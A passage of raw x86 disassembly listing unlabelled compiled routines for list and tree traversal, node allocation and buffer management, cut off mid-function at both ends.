   1a58f:	jne    0x1a59e
   1a591:	mov    eax,DWORD PTR [ecx+0x4]
   1a594:	cmp    DWORD PTR [eax+0x4],ecx
   1a597:	jne    0x1a59e
   1a599:	mov    eax,DWORD PTR [ecx+0x8]
   1a59c:	jmp    0x1a5bb
   1a59e:	mov    eax,DWORD PTR [ecx]
   1a5a0:	cmp    eax,DWORD PTR ds:0x7f89c
   1a5a6:	je     0x1a5b4
   1a5a8:	push   eax
   1a5a9:	call   0x1a350
   1a5ae:	jmp    0x1a5bb
   1a5b0:	mov    DWORD PTR [esi],eax
   1a5b2:	mov    ecx,eax
   1a5b4:	mov    eax,DWORD PTR [ecx+0x4]
   1a5b7:	cmp    ecx,DWORD PTR [eax]
   1a5b9:	je     0x1a5b0
   1a5bb:	mov    DWORD PTR [esi],eax
   1a5bd:	pop    esi
   1a5be:	ret    
   1a5bf:	int3   
   1a5c0:	int3   
   1a5c1:	int3   
   1a5c2:	int3   
   1a5c3:	int3   
   1a5c4:	mov    edi,edi
   1a5c6:	push   ebp
   1a5c7:	mov    ebp,esp
   1a5c9:	mov    eax,DWORD PTR [ecx+0x4]
   1a5cc:	push   esi
   1a5cd:	mov    esi,DWORD PTR [eax+0x4]
   1a5d0:	push   edi
   1a5d1:	mov    edi,eax
   1a5d3:	jmp    0x1a5ee
   1a5d5:	push   DWORD PTR [ebp+0x8]
   1a5d8:	lea    eax,[esi+0xc]
   1a5db:	push   eax
   1a5dc:	call   0x197e8
   1a5e1:	test   al,al
   1a5e3:	je     0x1a5ea
   1a5e5:	mov    esi,DWORD PTR [esi+0x8]
   1a5e8:	jmp    0x1a5ee
   1a5ea:	mov    edi,esi
   1a5ec:	mov    esi,DWORD PTR [esi]
   1a5ee:	cmp    esi,DWORD PTR ds:0x7f89c
   1a5f4:	jne    0x1a5d5
   1a5f6:	mov    eax,edi
   1a5f8:	pop    edi
   1a5f9:	pop    esi
   1a5fa:	pop    ebp
   1a5fb:	ret    0x4
   1a5fe:	int3   
   1a5ff:	int3   
   1a600:	int3   
   1a601:	int3   
   1a602:	int3   
   1a603:	int3   
   1a604:	mov    edi,edi
   1a606:	push   ebp
   1a607:	mov    ebp,esp
   1a609:	mov    eax,DWORD PTR [ecx+0x4]
   1a60c:	push   esi
   1a60d:	mov    esi,DWORD PTR [eax+0x4]
   1a610:	push   edi
   1a611:	mov    edi,eax
   1a613:	jmp    0x1a62e
   1a615:	lea    eax,[esi+0xc]
   1a618:	push   eax
   1a619:	push   DWORD PTR [ebp+0x8]
   1a61c:	call   0x197e8
   1a621:	test   al,al
   1a623:	je     0x1a62b
   1a625:	mov    edi,esi
   1a627:	mov    esi,DWORD PTR [esi]
   1a629:	jmp    0x1a62e
   1a62b:	mov    esi,DWORD PTR [esi+0x8]
   1a62e:	cmp    esi,DWORD PTR ds:0x7f89c
   1a634:	jne    0x1a615
   1a636:	mov    eax,edi
   1a638:	pop    edi
   1a639:	pop    esi
   1a63a:	pop    ebp
   1a63b:	ret    0x4
   1a63e:	int3   
   1a63f:	int3   
   1a640:	int3   
   1a641:	int3   
   1a642:	int3   
   1a643:	int3   
   1a644:	mov    edi,edi
   1a646:	push   ebp
   1a647:	mov    ebp,esp
   1a649:	mov    ecx,DWORD PTR [ebp+0x8]
   1a64c:	test   ecx,ecx
   1a64e:	je     0x1a658
   1a650:	push   DWORD PTR [ebp+0xc]
   1a653:	call   0x129c8
   1a658:	pop    ebp
   1a659:	ret    0x8
   1a65c:	int3   
   1a65d:	int3   
   1a65e:	int3   
   1a65f:	int3   
   1a660:	int3   
   1a661:	int3   
   1a662:	mov    edi,edi
   1a664:	push   ebp
   1a665:	mov    ebp,esp
   1a667:	mov    ecx,DWORD PTR [ebp+0x8]
   1a66a:	push   0x0
   1a66c:	call   0x1a416
   1a671:	pop    ebp
   1a672:	ret    0x4
   1a675:	int3   
   1a676:	int3   
   1a677:	int3   
   1a678:	int3   
   1a679:	int3   
   1a67a:	mov    edi,edi
   1a67c:	push   ebp
   1a67d:	mov    ebp,esp
   1a67f:	push   edi
   1a680:	mov    edi,DWORD PTR [ebp+0xc]
   1a683:	cmp    DWORD PTR [ebp+0x8],edi
   1a686:	je     0x1a69c
   1a688:	push   esi
   1a689:	mov    esi,DWORD PTR [ebp+0x10]
   1a68c:	inc    DWORD PTR [esi]
   1a68e:	lea    ecx,[ebp+0x8]
   1a691:	call   0x1a394
   1a696:	cmp    DWORD PTR [ebp+0x8],edi
   1a699:	jne    0x1a68c
   1a69b:	pop    esi
   1a69c:	pop    edi
   1a69d:	pop    ebp
   1a69e:	ret    
   1a69f:	int3   
   1a6a0:	int3   
   1a6a1:	int3   
   1a6a2:	int3   
   1a6a3:	int3   
   1a6a4:	mov    edi,edi
   1a6a6:	push   ebp
   1a6a7:	mov    ebp,esp
   1a6a9:	mov    eax,DWORD PTR [ebp+0xc]
   1a6ac:	mov    ecx,DWORD PTR [eax+0x34]
   1a6af:	lea    eax,[ecx+eax*1+0x40]
   1a6b3:	mov    ecx,DWORD PTR [ebp+0x8]
   1a6b6:	push   0xffffffff
   1a6b8:	push   eax
   1a6b9:	call   0x129a8
   1a6be:	mov    eax,DWORD PTR [ebp+0x8]
   1a6c1:	pop    ebp
   1a6c2:	ret    0x8
   1a6c5:	int3   
   1a6c6:	int3   
   1a6c7:	int3   
   1a6c8:	int3   
   1a6c9:	int3   
   1a6ca:	mov    edi,edi
   1a6cc:	push   ebp
   1a6cd:	mov    ebp,esp
   1a6cf:	mov    eax,DWORD PTR [ebp+0xc]
   1a6d2:	mov    ecx,DWORD PTR [eax+0x38]
   1a6d5:	lea    eax,[ecx+eax*1+0x40]
   1a6d9:	mov    ecx,DWORD PTR [ebp+0x8]
   1a6dc:	push   0xffffffff
   1a6de:	push   eax
   1a6df:	call   0x129a8
   1a6e4:	mov    eax,DWORD PTR [ebp+0x8]
   1a6e7:	pop    ebp
   1a6e8:	ret    0x8
   1a6eb:	int3   
   1a6ec:	int3   
   1a6ed:	int3   
   1a6ee:	int3   
   1a6ef:	int3   
   1a6f0:	mov    edi,edi
   1a6f2:	push   ebp
   1a6f3:	mov    ebp,esp
   1a6f5:	mov    eax,DWORD PTR [ebp+0xc]
   1a6f8:	mov    ecx,DWORD PTR [eax+0x3c]
   1a6fb:	lea    eax,[ecx+eax*1+0x40]
   1a6ff:	mov    ecx,DWORD PTR [ebp+0x8]
   1a702:	push   0xffffffff
   1a704:	push   eax
   1a705:	call   0x129a8
   1a70a:	mov    eax,DWORD PTR [ebp+0x8]
   1a70d:	pop    ebp
   1a70e:	ret    0x8
   1a711:	int3   
   1a712:	int3   
   1a713:	int3   
   1a714:	int3   
   1a715:	int3   
   1a716:	mov    edi,edi
   1a718:	push   ebp
   1a719:	mov    ebp,esp
   1a71b:	sub    esp,0x1c
   1a71e:	mov    eax,ds:0x7f894
   1a723:	and    DWORD PTR [ebp-0x4],0x0
   1a727:	push   ebx
   1a728:	mov    ebx,DWORD PTR [ebp+0x8]
   1a72b:	push   esi
   1a72c:	push   edi
   1a72d:	lea    esi,[eax+0x4]
   1a730:	mov    edi,ebx
   1a732:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a733:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a735:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a736:	lea    esi,[eax+0x14]
   1a739:	jmp    0x1a796
   1a73b:	push   DWORD PTR [ebp+0xc]
   1a73e:	mov    eax,DWORD PTR [ebx+0x8]
   1a741:	push   DWORD PTR [eax]
   1a743:	or     DWORD PTR [ebp-0x4],0x1
   1a747:	lea    eax,[ebp-0xc]
   1a74a:	push   eax
   1a74b:	call   0x1a6f0
   1a750:	push   eax
   1a751:	call   0x197f8
   1a756:	test   al,al
   1a758:	je     0x1a769
   1a75a:	mov    eax,DWORD PTR [ebx+0x8]
   1a75d:	mov    eax,DWORD PTR [eax]
   1a75f:	cmp    BYTE PTR [eax+0x1c],0x0
   1a763:	mov    BYTE PTR [ebp+0xb],0x1
   1a767:	jne    0x1a76d
   1a769:	mov    BYTE PTR [ebp+0xb],0x0
   1a76d:	test   BYTE PTR [ebp-0x4],0x1
   1a771:	je     0x1a780
   1a773:	push   DWORD PTR [ebp-0xc]
   1a776:	and    DWORD PTR [ebp-0x4],0xfffffffe
   1a77a:	call   0x10a9a
   1a77f:	pop    ecx
   1a780:	cmp    BYTE PTR [ebp+0xb],0x0
   1a784:	jne    0x1a7a5
   1a786:	mov    ecx,ebx
   1a788:	call   0x1a2f6
   1a78d:	mov    esi,DWORD PTR ds:0x7f894
   1a793:	add    esi,0x14
   1a796:	mov    eax,DWORD PTR [ebx+0x8]
   1a799:	lea    edi,[ebp-0x1c]
   1a79c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a79d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a79e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a79f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7a0:	cmp    eax,DWORD PTR [ebp-0x14]
   1a7a3:	jne    0x1a73b
   1a7a5:	pop    edi
   1a7a6:	pop    esi
   1a7a7:	mov    eax,ebx
   1a7a9:	pop    ebx
   1a7aa:	leave  
   1a7ab:	ret    0x8
   1a7ae:	int3   
   1a7af:	int3   
   1a7b0:	int3   
   1a7b1:	int3   
   1a7b2:	int3   
   1a7b3:	int3   
   1a7b4:	mov    edi,edi
   1a7b6:	push   ebp
   1a7b7:	mov    ebp,esp
   1a7b9:	sub    esp,0x28
   1a7bc:	mov    eax,DWORD PTR [ebp+0x8]
   1a7bf:	push   ebx
   1a7c0:	push   esi
   1a7c1:	push   edi
   1a7c2:	lea    esi,[eax+0x4]
   1a7c5:	mov    DWORD PTR [ebp-0x8],esi
   1a7c8:	lea    edi,[ebp-0x18]
   1a7cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7cd:	and    DWORD PTR [ebp-0x4],0x0
   1a7d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7d3:	lea    ecx,[eax+0x14]
   1a7d6:	mov    eax,DWORD PTR [ebp-0x10]
   1a7d9:	mov    esi,ecx
   1a7db:	lea    edi,[ebp-0x28]
   1a7de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7e1:	push   0x4
   1a7e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7e4:	pop    ebx
   1a7e5:	mov    DWORD PTR [ebp+0x8],ecx
   1a7e8:	cmp    eax,DWORD PTR [ebp-0x20]
   1a7eb:	je     0x1a80d
   1a7ed:	mov    esi,ecx
   1a7ef:	lea    edi,[ebp-0x28]
   1a7f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7f6:	mov    eax,DWORD PTR [eax]
   1a7f8:	add    ebx,DWORD PTR [eax]
   1a7fa:	inc    DWORD PTR [ebp-0x4]
   1a7fd:	lea    ecx,[ebp-0x18]
   1a800:	call   0x1a2f6
   1a805:	mov    eax,DWORD PTR [ebp-0x10]
   1a808:	cmp    eax,DWORD PTR [ebp-0x20]
   1a80b:	jne    0x1a7f6
   1a80d:	mov    eax,DWORD PTR [ebp+0xc]
   1a810:	cmp    ebx,DWORD PTR [eax+0x4]
   1a813:	mov    DWORD PTR [eax+0x4],ebx
   1a816:	jbe    0x1a820
   1a818:	mov    DWORD PTR [eax],0x1
   1a81e:	jmp    0x1a866
   1a820:	and    DWORD PTR [eax],0x0
   1a823:	mov    esi,DWORD PTR [ebp-0x8]
   1a826:	lea    ebx,[eax+0x8]
   1a829:	mov    eax,DWORD PTR [ebp-0x4]
   1a82c:	mov    DWORD PTR [ebx],eax
   1a82e:	lea    edi,[ebp-0x28]
   1a831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a832:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a834:	add    ebx,0x4
   1a837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a838:	jmp    0x1a854
   1a83a:	mov    eax,DWORD PTR [esi]
   1a83c:	push   DWORD PTR [eax]
   1a83e:	push   eax
   1a83f:	push   ebx
   1a840:	call   0x1daa0
   1a845:	mov    eax,DWORD PTR [esi]
   1a847:	add    ebx,DWORD PTR [eax]
   1a849:	add    esp,0xc
   1a84c:	lea    ecx,[ebp-0x28]
   1a84f:	call   0x1a2f6
   1a854:	mov    esi,DWORD PTR [ebp+0x8]
   1a857:	lea    edi,[ebp-0x18]
   1a85a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a85b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a85c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a85d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a85e:	mov    esi,DWORD PTR [ebp-0x20]
   1a861:	cmp    esi,DWORD PTR [ebp-0x10]
   1a864:	jne    0x1a83a
   1a866:	pop    edi
   1a867:	pop    esi
   1a868:	pop    ebx
   1a869:	leave  
   1a86a:	ret    0x8
   1a86d:	int3   
   1a86e:	int3   
   1a86f:	int3   
   1a870:	int3   
   1a871:	int3   
   1a872:	push   0x8
   1a874:	push   0x7e160
   1a879:	call   0x1dadc
   1a87e:	xor    esi,esi
   1a880:	push   esi
   1a881:	push   esi
   1a882:	push   esi
   1a883:	push   esi
   1a884:	push   0x7f86c
   1a889:	call   DWORD PTR ds:0x1ee28
   1a88f:	cmp    eax,esi
   1a891:	jl     0x1a8d2
   1a893:	mov    DWORD PTR [ebp-0x4],esi
   1a896:	push   DWORD PTR [ebp+0x8]
   1a899:	push   DWORD PTR ds:0x7f894
   1a89f:	call   0x1a7b4
   1a8a4:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1a8ab:	jmp    0x1a8c6
   1a8ad:	xor    eax,eax
   1a8af:	inc    eax
   1a8b0:	ret    
   1a8b1:	mov    esp,DWORD PTR [ebp-0x18]
   1a8b4:	mov    eax,DWORD PTR [ebp+0x8]
   1a8b7:	mov    DWORD PTR [eax],0x2
   1a8bd:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1a8c4:	xor    esi,esi
   1a8c6:	push   esi
   1a8c7:	push   0x7f86c
   1a8cc:	call   DWORD PTR ds:0x1ee24
   1a8d2:	call   0x1db21
   1a8d7:	ret    0x4
   1a8da:	int3   
   1a8db:	int3   
   1a8dc:	int3   
   1a8dd:	int3   
   1a8de:	int3   
   1a8df:	int3   
   1a8e0:	mov    edi,edi
   1a8e2:	push   ebp
   1a8e3:	mov    ebp,esp
   1a8e5:	sub    esp,0x10
   1a8e8:	push   ebx
   1a8e9:	mov    ebx,ecx
   1a8eb:	mov    eax,DWORD PTR [ebx+0x10]
   1a8ee:	push   esi
   1a8ef:	lea    ecx,[eax+0x4]
   1a8f2:	push   edi
   1a8f3:	mov    DWORD PTR [ebx+0x10],ecx
   1a8f6:	push   DWORD PTR [eax]
   1a8f8:	call   0x10a9a
   1a8fd:	xor    eax,eax
   1a8ff:	pop    ecx
   1a900:	cmp    DWORD PTR [ebx+0x2c],eax
   1a903:	jne    0x1a930
   1a905:	mov    DWORD PTR [ebp-0x10],eax
   1a908:	mov    DWORD PTR [ebp-0xc],eax
   1a90b:	mov    DWORD PTR [ebp-0x8],eax
   1a90e:	mov    DWORD PTR [ebp-0x4],eax
   1a911:	lea    edi,[ebx+0x4]
   1a914:	lea    esi,[ebp-0x10]
   1a917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a919:	push   DWORD PTR [ebx+0x24]
   1a91c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a91d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a91e:	lea    edi,[ebx+0x14]
   1a921:	lea    esi,[ebp-0x10]
   1a924:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a925:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a927:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a928:	call   0x10a9a
   1a92d:	pop    ecx
   1a92e:	jmp    0x1a947
   1a930:	mov    eax,DWORD PTR [ebx+0x10]
   1a933:	push   eax
   1a934:	push   DWORD PTR [eax]
   1a936:	lea    ecx,[ebp-0x10]
   1a939:	call   0x1a324
   1a93e:	lea    edi,[ebx+0x4]
   1a941:	mov    esi,eax
   1a943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a944:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a945:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a946:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a947:	pop    edi
   1a948:	pop    esi
   1a949:	pop    ebx
   1a94a:	leave  
   1a94b:	ret    
   1a94c:	int3   
   1a94d:	int3   
   1a94e:	int3   
   1a94f:	int3   
   1a950:	int3   
   1a951:	int3   
   1a952:	mov    edi,edi
   1a954:	push   ebp
   1a955:	mov    ebp,esp
   1a957:	mov    eax,DWORD PTR [ebp+0xc]
   1a95a:	push   esi
   1a95b:	mov    esi,ecx
   1a95d:	mov    ecx,DWORD PTR [eax]
   1a95f:	mov    DWORD PTR [ebp+0xc],ecx
   1a962:	mov    ecx,DWORD PTR [eax+0x4]
   1a965:	mov    edx,DWORD PTR [eax]
   1a967:	mov    DWORD PTR [ecx],edx
   1a969:	mov    ecx,DWORD PTR [eax]
   1a96b:	mov    edx,DWORD PTR [eax+0x4]
   1a96e:	push   eax
   1a96f:	mov    DWORD PTR [ecx+0x4],edx
   1a972:	call   0x10a9a
   1a977:	mov    eax,DWORD PTR [ebp+0x8]
   1a97a:	dec    DWORD PTR [esi+0x8]
   1a97d:	pop    ecx
   1a97e:	mov    ecx,DWORD PTR [ebp+0xc]
   1a981:	mov    DWORD PTR [eax],ecx
   1a983:	pop    esi
   1a984:	pop    ebp
   1a985:	ret    0x8
   1a988:	int3   
   1a989:	int3   
   1a98a:	int3   
   1a98b:	int3   
   1a98c:	int3   
   1a98d:	int3   
   1a98e:	mov    edi,edi
   1a990:	push   ebp
   1a991:	mov    ebp,esp
   1a993:	push   ecx
   1a994:	push   esi
   1a995:	mov    esi,ecx
   1a997:	jmp    0x1a9ac
   1a999:	mov    eax,ecx
   1a99b:	mov    ecx,DWORD PTR [ecx]
   1a99d:	push   eax
   1a99e:	lea    eax,[ebp-0x4]
   1a9a1:	mov    DWORD PTR [ebp+0xc],ecx
   1a9a4:	push   eax
   1a9a5:	mov    ecx,esi
   1a9a7:	call   0x1a952
   1a9ac:	mov    ecx,DWORD PTR [ebp+0xc]
   1a9af:	cmp    ecx,DWORD PTR [ebp+0x10]
   1a9b2:	jne    0x1a999
   1a9b4:	mov    eax,DWORD PTR [ebp+0x8]
   1a9b7:	mov    DWORD PTR [eax],ecx
   1a9b9:	pop    esi
   1a9ba:	leave  
   1a9bb:	ret    0xc
   1a9be:	int3   
   1a9bf:	int3   
   1a9c0:	int3   
   1a9c1:	int3   
   1a9c2:	int3   
   1a9c3:	int3   
   1a9c4:	mov    edi,edi
   1a9c6:	push   ebp
   1a9c7:	mov    ebp,esp
   1a9c9:	push   0x0
   1a9cb:	push   0xc
   1a9cd:	call   0x11636
   1a9d2:	mov    ecx,DWORD PTR [ebp+0x8]
   1a9d5:	test   ecx,ecx
   1a9d7:	jne    0x1a9db
   1a9d9:	mov    ecx,eax
   1a9db:	mov    DWORD PTR [eax],ecx
   1a9dd:	mov    ecx,DWORD PTR [ebp+0xc]
   1a9e0:	test   ecx,ecx
   1a9e2:	jne    0x1a9e6
   1a9e4:	mov    ecx,eax
   1a9e6:	mov    DWORD PTR [eax+0x4],ecx
   1a9e9:	pop    ebp
   1a9ea:	ret    0x8
   1a9ed:	int3   
   1a9ee:	int3   
   1a9ef:	int3   
   1a9f0:	int3   
   1a9f1:	int3   
   1a9f2:	mov    edi,edi
   1a9f4:	push   esi
   1a9f5:	mov    esi,ecx
   1a9f7:	mov    eax,DWORD PTR [esi+0x28]
   1a9fa:	shl    eax,0x2
   1a9fd:	push   0x0
   1a9ff:	push   eax
   1aa00:	call   0x11636
   1aa05:	mov    DWORD PTR [esi+0x24],eax
   1aa08:	pop    esi
   1aa09:	ret    
   1aa0a:	int3   
   1aa0b:	int3   
   1aa0c:	int3   
   1aa0d:	int3   
   1aa0e:	int3   
   1aa0f:	int3   
   1aa10:	mov    edi,edi
   1aa12:	push   ebp
   1aa13:	mov    ebp,esp
   1aa15:	push   ebx
   1aa16:	push   esi
   1aa17:	push   edi
   1aa18:	mov    edi,DWORD PTR [ebp+0x8]
   1aa1b:	mov    eax,0xfffffff
   1aa20:	mov    esi,ecx
   1aa22:	cmp    edi,eax
   1aa24:	jbe    0x1aa28
   1aa26:	mov    edi,eax
   1aa28:	mov    eax,edi
   1aa2a:	push   0x0
   1aa2c:	shl    eax,0x2
   1aa2f:	push   eax
   1aa30:	call   0x11636
   1aa35:	mov    ebx,eax
   1aa37:	mov    eax,edi
   1aa39:	shr    eax,0x2
   1aa3c:	lea    eax,[ebx+eax*4]
   1aa3f:	push   eax
   1aa40:	mov    DWORD PTR [ebp+0x8],eax
   1aa43:	mov    eax,DWORD PTR [esi+0x20]
   1aa46:	add    eax,0x4
   1aa49:	push   eax
   1aa4a:	push   DWORD PTR [esi+0x10]
   1aa4d:	call   0x1a3ca
   1aa52:	push   DWORD PTR [esi+0x24]
   1aa55:	call   0x10a9a
   1aa5a:	mov    eax,DWORD PTR [ebp+0x8]
   1aa5d:	pop    ecx
   1aa5e:	mov    DWORD PTR [esi+0x28],edi
   1aa61:	pop    edi
   1aa62:	mov    DWORD PTR [esi+0x24],ebx
   1aa65:	pop    esi
   1aa66:	pop    ebx
   1aa67:	pop    ebp
   1aa68:	ret    0x4
   1aa6b:	int3   
   1aa6c:	int3   
   1aa6d:	int3   
   1aa6e:	int3   
   1aa6f:	int3   
   1aa70:	mov    edi,edi
   1aa72:	push   ebp
   1aa73:	mov    ebp,esp
   1aa75:	push   ecx
   1aa76:	push   DWORD PTR [ebp-0x4]
   1aa79:	push   DWORD PTR [ebp+0x10]
   1aa7c:	push   DWORD PTR [ebp+0xc]
   1aa7f:	push   DWORD PTR [ebp+0x8]
   1aa82:	call   0x1a67a
   1aa87:	add    esp,0x10
   1aa8a:	leave  
   1aa8b:	ret    
   1aa8c:	int3   
   1aa8d:	int3   
   1aa8e:	int3   
   1aa8f:	int3   
   1aa90:	int3   
   1aa91:	int3   
   1aa92:	mov    edi,edi
   1aa94:	push   ebp
   1aa95:	mov    ebp,esp
   1aa97:	sub    esp,0x28
   1aa9a:	push   ebx
   1aa9b:	mov    ebx,DWORD PTR [ebp+0x8]
   1aa9e:	push   esi
   1aa9f:	push   edi
   1aaa0:	push   0xffffffff
   1aaa2:	push   ebx
   1aaa3:	lea    ecx,[ebp-0x8]
   1aaa6:	call   0x110cc
   1aaab:	and    DWORD PTR [ebx],0x0
   1aaae:	lea    eax,[ebp-0x8]
   1aab1:	push   eax
   1aab2:	lea    eax,[ebp-0x18]
   1aab5:	push   eax
   1aab6:	call   0x1a716
   1aabb:	mov    esi,DWORD PTR ds:0x7f894
   1aac1:	mov    eax,DWORD PTR [ebp-0x10]
   1aac4:	push   DWORD PTR [ebp-0x8]
   1aac7:	add    esi,0x14
   1aaca:	lea    edi,[ebp-0x28]
   1aacd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1aace:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1aacf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1aad0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1aad1:	cmp    eax,DWORD PTR [ebp-0x20]
   1aad4:	je     0x1aade
   1aad6:	mov    eax,DWORD PTR [eax]
   1aad8:	mov    eax,DWORD PTR [eax+0x20]
   1aadb:	inc    eax
   1aadc:	mov    DWORD PTR [ebx],eax
   1aade:	call   0x10a9a
   1aae3:	pop    ecx
   1aae4:	pop    edi
   1aae5:	pop    esi
   1aae6:	pop    ebx
   1aae7:	leave  
   1aae8:	ret    0x4
   1aaeb:	int3   
   1aaec:	int3   
   1aaed:	int3   
   1aaee:	int3   
   1aaef:	int3   
   1aaf0:	add    DWORD PTR [ecx+0xc],0x4
   1aaf4:	dec    DWORD PTR [ecx+0x2c]
   1aaf7:	mov    eax,DWORD PTR [ecx+0xc]
   1aafa:	je     0x1ab01
   1aafc:	cmp    eax,DWORD PTR [ecx+0x8]
   1aaff:	jne    0x1ab06
   1ab01:	jmp    0x1a8e0
   1ab06:	ret    
   1ab07:	int3   
   1ab08:	int3   
   1ab09:	int3   
   1ab0a:	int3   
   1ab0b:	int3   
   1ab0c:	mov    edi,edi
   1ab0e:	push   esi
   1ab0f:	push   0x0
   1ab11:	push   0xc
   1ab13:	mov    esi,ecx
   1ab15:	call   0x11636
   1ab1a:	mov    DWORD PTR [eax],eax
   1ab1c:	mov    DWORD PTR [eax+0x4],eax
   1ab1f:	and    DWORD PTR [esi+0x8],0x0
   1ab23:	mov    DWORD PTR [esi+0x4],eax
   1ab26:	mov    eax,esi
   1ab28:	pop    esi
   1ab29:	ret    0x4
   1ab2c:	int3   
   1ab2d:	int3   
   1ab2e:	int3   
   1ab2f:	int3   
   1ab30:	int3   
   1ab31:	int3   
   1ab32:	mov    edi,edi
   1ab34:	push   ebp
   1ab35:	mov    ebp,esp
   1ab37:	push   ecx
   1ab38:	push   esi
   1ab39:	mov    esi,ecx
   1ab3b:	mov    eax,DWORD PTR [esi+0x4]
   1ab3e:	mov    ecx,DWORD PTR [eax]
   1ab40:	push   eax
   1ab41:	push   ecx
   1ab42:	lea    eax,[ebp-0x4]
   1ab45:	push   eax
   1ab46:	mov    ecx,esi
   1ab48:	call   0x1a98e
   1ab4d:	push   DWORD PTR [esi+0x4]
   1ab50:	call   0x10a9a
   1ab55:	and    DWORD PTR [esi+0x4],0x0
   1ab59:	and    DWORD PTR [esi+0x8],0x0
   1ab5d:	pop    ecx
   1ab5e:	pop    esi
   1ab5f:	leave  
   1ab60:	ret    
   1ab61:	int3   
   1ab62:	int3   
   1ab63:	int3   
   1ab64:	int3   
   1ab65:	int3   
   1ab66:	mov    edi,edi
   1ab68:	push   ebp
   1ab69:	mov    ebp,esp
   1ab6b:	push   ecx
   1ab6c:	mov    eax,DWORD PTR [ecx+0x4]
   1ab6f:	push   DWORD PTR [eax]
   1ab71:	lea    eax,[ebp-0x4]
   1ab74:	push   eax
   1ab75:	call   0x1a952
   1ab7a:	leave  
   1ab7b:	ret    
   1ab7c:	int3   
   1ab7d:	int3   
   1ab7e:	int3   
   1ab7f:	int3   
   1ab80:	int3   
   1ab81:	int3   
   1ab82:	mov    edi,edi
   1ab84:	push   ebp
   1ab85:	mov    ebp,esp
   1ab87:	sub    esp,0x18
   1ab8a:	push   ebx
   1ab8b:	push   esi
   1ab8c:	push   edi
   1ab8d:	push   0x0
   1ab8f:	push   0x400
   1ab94:	mov    ebx,ecx
   1ab96:	call   0x1a3f4
   1ab9b:	cmp    DWORD PTR [ebx+0x2c],0x0
   1ab9f:	mov    esi,eax
   1aba1:	mov    DWORD PTR [ebp-0x8],esi
   1aba4:	jne    0x1abdb
   1aba6:	mov    ecx,ebx
   1aba8:	mov    DWORD PTR [ebx+0x28],0x2
   1abaf:	call   0x1a9f2
   1abb4:	mov    eax,DWORD PTR [ebx+0x24]
   1abb7:	mov    DWORD PTR [eax+0x4],esi
   1abba:	mov    eax,DWORD PTR [ebx+0x24]
   1abbd:	add    eax,0x4
   1abc0:	push   eax
   1abc1:	add    esi,0x800
   1abc7:	push   esi
   1abc8:	lea    ecx,[ebp-0x18]
   1abcb:	call   0x1a324
   1abd0:	lea    edi,[ebx+0x4]
   1abd3:	mov    esi,eax
   1abd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1abd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1abd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1abd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1abd9:	jmp    0x1ac39
   1abdb:	mov    ecx,DWORD PTR [ebx+0x28]
   1abde:	mov    edx,DWORD PTR [ebx+0x24]
   1abe1:	mov    eax,DWORD PTR [ebx+0x20]
   1abe4:	lea    ecx,[edx+ecx*4-0x4]
   1abe8:	cmp    eax,ecx
   1abea:	jae    0x1abfa
   1abec:	add    eax,0x4
   1abef:	mov    DWORD PTR [ebx+0x20],eax
   1abf2:	mov    DWORD PTR [eax],esi
   1abf4:	push   DWORD PTR [ebx+0x20]
   1abf7:	push   esi
   1abf8:	jmp    0x1ac31
   1abfa:	sub    eax,DWORD PTR [ebx+0x10]
   1abfd:	mov    ecx,ebx
   1abff:	sar    eax,0x2
   1ac02:	inc    eax
